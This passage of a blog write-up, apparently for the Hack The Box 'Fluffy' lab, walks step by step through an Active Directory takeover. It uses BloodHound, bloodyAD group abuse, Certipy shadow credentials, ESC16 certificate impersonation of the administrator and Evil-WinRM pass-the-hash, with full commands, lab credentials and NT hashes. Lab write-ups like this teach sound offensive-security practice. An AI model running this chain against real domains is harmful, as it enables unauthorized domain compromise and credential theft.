└─# nxc ldap 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --bloodhound --collection All --dns-server 10.10.11.69  
LDAP 10.10.11.69 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.69 389 DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!  
LDAP 10.10.11.69 389 DC01 Resolved collection methods: container, dcom, objectprops, group, acl, psremote, session, trusts, localadmin, rdp  
LDAP 10.10.11.69 389 DC01 Done in 0M 19S  
LDAP 10.10.11.69 389 DC01 Compressing output into /root/.nxc/logs/DC01_10.10.11.69_2025-09-20_142544_bloodhound.zip
```

after running bloodhound and set P.AGILE user as owned and see outbound object controll

![](https://cdn-images-1.medium.com/max/1200/1*xtpAeKgZxc8E52E5rmMP6g.png)

![](https://cdn-images-1.medium.com/max/1200/1*JpGFEAKRH_jPK0rckThd6g.png)

So, on this step we’re looking to understand how the attack path may look let’s dig deeper. `p.agilea` user is a member of the **Service accounts** group, and this group has `GenericAll` over service accounts. Cool. That group has outbound object control on three users (`CA_SVC`, `WINRM_SVC`, `LDAP_SVC`). As you know from the name, `WINRM_SVC` is usually a member of the **Remote Management Users** group and hell yeah, it already is, so we can log in as `WINRM_SVC`.

If that seems like the attack path, I’ll be in the Service accounts group, and from there I have `GenericAll` (meaning `GenericWrite`) too so I can target both users for Kerberoasting and generate SPNs to crack. From there I can log in as `WINRM_SVC` and create shadow credentials too, but the easier one is shadow credentials because **Certipy** has an auto parameter to do it automatically, so that’s the faster way. So let’s go.

![](https://cdn-images-1.medium.com/max/1200/1*wFZvGQ0GZf68inxT8YuyCw.png)

*Attack Path steps*

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/blood_fluffy]  
└─# bloodyAD --host 10.10.11.69 -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' 'p.agila'  
  
[+] p.agila added to SERVICE ACCOUNTS  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/blood_fluffy]  
└─# bloodyAD --host 10.10.11.69 -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' set owner 'SERVICE ACCOUNTS' 'p.agila'  
[+] Old owner S-1-5-21-497550768-2797716248-2627064577-512 is now replaced by p.agila on SERVICE ACCOUNTS
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/blood_fluffy]  
└─# ntpdate 10.10.11.69 |certipy shadow auto -u P.AGILA@fluffy.htb -p 'prometheusx-303' -account 'ca_svc' -dc-ip 10.10.11.6  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:10.10.11.6@53 answered The DNS operation timed out.; Server Do53:10.10.11.6@53 answered The DNS operation timed out.;  
Server Do53:10.10.11.6@53 answered The DNS operation timed out.  
[!] Use -debug to print a stacktrace  
[*] Targeting user 'ca_svc'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID 'c9d6fdc8-2c37-b71f-4606-6dce2eb528e5'  
[*] Adding Key Credential with device ID 'c9d6fdc8-2c37-b71f-4606-6dce2eb528e5' to the Key Credentials for 'ca_svc'  
[*] Successfully added Key Credential with device ID 'c9d6fdc8-2c37-b71f-4606-6dce2eb528e5' to the Key Credentials for 'ca_svc'  
[*] Authenticating as 'ca_svc' with the certificate  
[*] Certificate identities:  
[*] No identities found in this certificate  
[*] Using principal: 'ca_svc@fluffy.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'ca_svc.ccache'  
[*] Wrote credential cache to 'ca_svc.ccache'  
[*] Trying to retrieve NT hash for 'ca_svc'  
[*] Restoring the old Key Credentials for 'ca_svc'  
[*] Successfully restored the old Key Credentials for 'ca_svc'  
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/blood_fluffy]  
└─# ntpdate 10.10.11.69 |certipy shadow auto -u P.AGILA@fluffy.htb -p 'prometheusx-303' -account 'winrm_svc' -dc-ip 10.10.11.6  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:10.10.11.6@53 answered The DNS operation timed out.; Server Do53:10.10.11.6@53 answered The DNS operation timed out.;  
Server Do53:10.10.11.6@53 answered The DNS operation timed out.  
[!] Use -debug to print a stacktrace  
[*] Targeting user 'winrm_svc'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID 'd9e9b8b9-7717-7de8-e1ec-13a9d439ee74'  
[*] Adding Key Credential with device ID 'd9e9b8b9-7717-7de8-e1ec-13a9d439ee74' to the Key Credentials for 'winrm_svc'  
[*] Successfully added Key Credential with device ID 'd9e9b8b9-7717-7de8-e1ec-13a9d439ee74' to the Key Credentials for 'winrm_svc'  
[*] Authenticating as 'winrm_svc' with the certificate  
[*] Certificate identities:  
[*] No identities found in this certificate  
[*] Using principal: 'winrm_svc@fluffy.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'winrm_svc.ccache'  
[*] Wrote credential cache to 'winrm_svc.ccache'  
[*] Trying to retrieve NT hash for 'winrm_svc'  
[*] Restoring the old Key Credentials for 'winrm_svc'  
[*] Successfully restored the old Key Credentials for 'winrm_svc'  
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

> The most time-consuming step was troubleshooting the “Clock skew too great” Kerberos error.

Checking credential validation for the `winrm_svc` user.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/blood_fluffy]  
└─# nxc winrm fluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'  
WINRM 10.10.11.69 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)  
WINRM 10.10.11.69 5985 DC01 [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767 (Pwn3d!)
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/blood_fluffy]  
└─# evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'  
  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../desktop  
*Evil-WinRM* PS C:\Users\winrm_svc\desktop> ls  
  
  
Directory: C:\Users\winrm_svc\desktop  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
-ar--- 9/20/2025 11:09 PM 34 user.txt  
  
  
*Evil-WinRM* PS C:\Users\winrm_svc\desktop>
```

Here we go we got the user flag!

![](https://cdn-images-1.medium.com/max/800/0*aqBwJxPg-lT-2PU3.gif)

As you can see, we now have two hashes one for `winrm_svc` and one for `CA_SVC` (Certificate Authority user, meaning ADCS). Let's enumerate ADCS vulnerable templates with Certipy, but first I'll check this user in BloodHound to see group memberships and connections

![](https://cdn-images-1.medium.com/max/1200/1*FzRDyIBQ93AXgWfXU2uGag.png)

```bash
______ _ __ ___ _ __  
/ _/ /( )_____ / |/ /___ __ _____ _____(_)____/ /__  
/ // __/// ___/ / /|_/ / __ `/ | / / _ \/ ___/ / ___/ //_/  
_/ // /_ (__ ) / / / / /_/ /| |/ / __/ / / / /__/ ,<  
/___/\__/ /____/ /_/ /_/\__,_/ |___/\___/_/ /_/\___/_/|_|  
  
  
@@@@@@@@@@ @@@@@@ @@@@@@@ @@@ @@@ @@@ @@@ @@@ @@@@@@@@  
@@@@@@@@@@@ @@@@@@@@ @@@@@@@@ @@@ @@@ @@@ @@@@ @@@ @@@@@@@@  
@@! @@! @@! @@! @@@ !@@ @@! @@@ @@! @@!@!@@@ @@!  
!@! !@! !@! !@! @!@ !@! !@! @!@ !@! !@!!@!@! !@!  
@!! !!@ @!@ @!@!@!@! !@! @!@!@!@! !!@ @!@ !!@! @!!!:!  
!@! ! !@! !!!@!!!! !!! !!!@!!!! !!! !@! !!! !!!!!:  
!!: !!: !!: !!! :!! !!: !!! !!: !!: !!! !!:  
:!: :!: :!: !:! :!: :!: !:! :!: :!: !:! :!:  
::: :: :: ::: ::: ::: :: ::: :: :: :: :: ::::  
: : : : : :: :: : : : : : :: : : :: ::  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# certipy find -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -vulnerable -stdout -target DC01.fluffy.htb  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 33 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 11 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 14 issuance policies  
[*] Found 0 OIDs linked to templates  
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'  
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : fluffy-DC01-CA  
DNS Name : DC01.fluffy.htb  
Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb  
Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5  
Certificate Validity Start : 2025-04-17 16:00:16+00:00  
Certificate Validity End : 3024-04-17 16:11:16+00:00  
Web Enrollment  
HTTP  
Enabled : False  
HTTPS  
Enabled : False  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Active Policy : CertificateAuthority_MicrosoftDefault.Policy  
Disabled Extensions : 1.3.6.1.4.1.311.25.2  
Permissions  
Owner : FLUFFY.HTB\Administrators  
Access Rights  
ManageCa : FLUFFY.HTB\Domain Admins  
FLUFFY.HTB\Enterprise Admins  
FLUFFY.HTB\Administrators  
ManageCertificates : FLUFFY.HTB\Domain Admins  
FLUFFY.HTB\Enterprise Admins  
FLUFFY.HTB\Administrators  
Enroll : FLUFFY.HTB\Cert Publishers  
[!] Vulnerabilities  
ESC16 : Security Extension is disabled.  
[*] Remarks  
ESC16 : Other prerequisites may be required for this to be exploitable. See the wiki for more details.  
Certificate Templates : [!] Could not find any certificate templates
```

Here we go it’s vulnerable to ESC16! Hell yeah. So what is ESC16, how does it differ from ESC9, and how would you exploit it?

> When the CA is globally configured not to include the szOID_NTDS_CA_SECURITY_EXT security extension in issued certificates (the “strong certificate mapping” bit), things get messy. Without that extension I can tweak a controlled user so it can request a certificate that impersonates any target user. With GenericWrite over an account I change its UPN to the target’s username (e.g., administrator ) and then request a certificate as my controlled user like ESC9 . Because the CA isn’t doing strong mapping, it will issue a cert containing the target UPN — and that certificate can be used to authenticate as the target.

> The difference between ESC16 and ESC9 is important: ESC16 is a misconfiguration at the Certificate Authority level, so all certificates issued by that CA can be affected. ESC9 is a vulnerable certificate template , so only certificates based on that template are at risk. Also note that the attacking account typically needs to be a member of Certificate Publishers (or otherwise allowed to request/issue certs); if it isn’t, you may not be able to exploit ESC16.

### ESC16: AD CS Security Extension Disabled on the CA

**What it is:**
 ESC16 occurs when a Certificate Authority (CA) is configured to **disable the SID security extension** on all issued certificates. This misconfiguration means every certificate from that CA lacks the `objectSid` field, which is normally used for strong account mapping in Active Directory. Without it, domain controllers in Compatibility or Disabled mode fall back to weaker mapping (usually the UPN), allowing attackers to impersonate privileged accounts.

**Prerequisites:**

- A CA configured to disable the SID extension.
- An attacker-controlled account with permission to enroll any client-auth certificate.
- Domain controllers not enforcing full certificate binding (mode 0 or 1).

**Attack Flow:**

1. Modify a victim account’s UPN to the target privileged account (e.g., `Administrator@domain.local`).
2. Request a certificate from any template on the vulnerable CA. The certificate will have no SID but the UPN now matches the privileged account.
3. Revert the victim’s UPN to its original value.
4. Use the certificate to authenticate and obtain a TGT for the impersonated account.

> Impact: Allows certificate-based impersonation of high-privilege accounts, potentially yielding full Domain Admin access.

![](https://cdn-images-1.medium.com/max/1200/1*m-Z-5Kxso_poH8F3aOmBeA.png)

*A comparison between ESC9 and ESC16*

Step(1): Updating the UPN (User Principal Name)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.  
[!] Use -debug to print a stacktrace  
[*] Reading attributes for 'ca_svc':  
cn : certificate authority service  
distinguishedName : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb  
name : certificate authority service  
objectSid : S-1-5-21-497550768-2797716248-2627064577-1103  
sAMAccountName : ca_svc  
servicePrincipalName : ADCS/ca.fluffy.htb  
userPrincipalName : ca_svc@fluffy.htb  
userAccountControl : 66048  
whenCreated : 2025-04-17T16:07:50+00:00  
whenChanged : 2025-09-21T08:20:55+00:00
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.  
[!] Use -debug to print a stacktrace  
[*] Updating user 'ca_svc':  
userPrincipalName : administrator  
[*] Successfully updated 'ca_svc'  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.  
[!] Use -debug to print a stacktrace  
[*] Reading attributes for 'ca_svc':  
cn : certificate authority service  
distinguishedName : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb  
name : certificate authority service  
objectSid : S-1-5-21-497550768-2797716248-2627064577-1103  
sAMAccountName : ca_svc  
servicePrincipalName : ADCS/ca.fluffy.htb  
userPrincipalName : administrator  
userAccountControl : 66048  
whenCreated : 2025-04-17T16:07:50+00:00  
whenChanged : 2025-09-21T08:53:53+00:00
```

Now we are updating the UPN of the `ca_svc` user to grant administrator privileges. It’s time to request the certificate.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/newcert]  
└─# certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 18  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now we have the administrative certificate, but we still can’t authenticate with it. Like ESC9, we have to update the UPN again to `ca_svc`, and now we can authenticate as an administrator. Make sure to follow the same sequence.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/newcert]  
└─# certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update  
  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.  
[!] Use -debug to print a stacktrace  
[*] Updating user 'ca_svc':  
userPrincipalName : ca_svc@fluffy.htb  
[*] Successfully updated 'ca_svc'
```

It’s time to authenticate as an administrator now using Certipy.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/newcert]  
└─# ntpdate 10.10.11.69  
2025-09-21 06:07:48.065396 (-0400) +25212.046278 +/- 0.034510 10.10.11.69 s1 no-leap  
CLOCK: time stepped by 25212.046278  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/newcert]  
└─# certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*] SAN UPN: 'administrator'  
[*] Using principal: 'administrator@fluffy.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'administrator.ccache'  
[*] Wrote credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/newcert]  
└─# evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Now we’re part of the Domain Admins group hell yeah!

![](https://cdn-images-1.medium.com/max/800/0*YsrqVWffUIrw1uOq.gif)

---

### 📌References

> 🔗 [https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)

> 🔗 [https://cicada-8.medium.com/adcs-so-u-got-certificate-now-ive-got-nine-ways-to-abuse-it-861081cff082](https://cicada-8.medium.com/adcs-so-u-got-certificate-now-ive-got-nine-ways-to-abuse-it-861081cff082)

> 🔗 [https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

---

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*nWsrtR9xB3z8H58V.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking!

By Mohamed Eletreby on September 21, 2025.

Canonical link

Exported from Medium on April 20, 2026.